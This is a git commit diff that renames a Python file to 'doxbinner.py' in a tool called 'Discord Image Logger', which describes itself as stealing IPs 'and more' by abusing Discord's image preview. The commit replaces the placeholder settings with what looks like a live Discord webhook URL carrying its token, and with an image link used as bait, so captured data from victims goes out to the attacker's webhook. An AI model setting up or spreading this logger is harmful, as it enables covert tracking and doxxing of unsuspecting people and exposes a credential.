301eb14d3257a2966da259bcf64ba7f4ba6b387d
itsyaboiinject <140984887+itsyaboiinject@users.noreply.github.com>
2023-08-04 10:47:01 -0400

    Update and rename main.py to doxbinner.py

--- api/doxbinner.py
+++ api/doxbinner.py
@@ -8,17 +8,17 @@ import traceback, requests, base64, httpagentparser
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
-__author__ = "DeKrypt"
+__author__ = "Lucifer || Image Logger"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1136824966789218306/CNQpm_2YT3NjRRbSHRRC3aL2ZD2x7azO7ssXBE9wwWYEbm_wi7ETM4Kp4Yuhy4RVW3_-",
+    "image": "https://m.gjcdn.net/fireside-post-image/700/4545190-eimuacrc-v4.webp", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "Bin", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
